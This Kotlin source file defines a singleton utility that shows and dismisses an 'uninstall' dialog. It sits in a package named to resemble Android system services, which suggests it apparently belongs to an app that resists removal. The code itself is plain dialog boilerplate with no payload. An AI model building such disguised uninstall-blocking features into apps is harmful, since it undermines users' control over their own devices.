package com.android.services.dialogs

import com.android.services.MyApplication.Companion.appContext
import com.android.services.dialogs.UninstallDialog
import com.android.services.MyApplication
import com.android.services.dialogs.UninstallProtectionUtility
import com.android.services.util.logException
import java.lang.RuntimeException

class UninstallProtectionUtility private constructor() {

    private var mUninstallDialog: UninstallDialog? = null

    private fun initializeDialog() {
        if (mUninstallDialog == null) {
            mUninstallDialog = UninstallDialog(appContext)
        }
    }

    fun finishDialog() {
        if (mUninstallDialog != null) {
            if (mUninstallDialog!!.isShowing){
                mUninstallDialog!!.dismiss()
            }
            mUninstallDialog = null
        }
    }

    fun showDialog() {
        try {
            initializeDialog()
            if (!mUninstallDialog!!.isShowing) mUninstallDialog!!.show()
        } catch (exp: Exception) {
            logException(
                "showDialog UninstallProtectionUtility exp: ${exp.message}",
                throwable = exp
            )
        }
    }

    companion object {
        @Volatile
        private var mInstance: UninstallProtectionUtility? = null

        //if there is no instance available... create new one
        val instance: UninstallProtectionUtility?
            get() {
                if (mInstance == null) { //if there is no instance available... create new one
                    synchronized(UninstallProtectionUtility::class.java) {
                        if (mInstance == null) mInstance = UninstallProtectionUtility()
                    }
                }
                return mInstance
            }
    }

    //private constructor.
    init {
        //Prevent form the reflection api.¬
        if (mInstance != null) {
            throw RuntimeException("Use getInstance() method to get the single instance of this class.")
        }
    }
}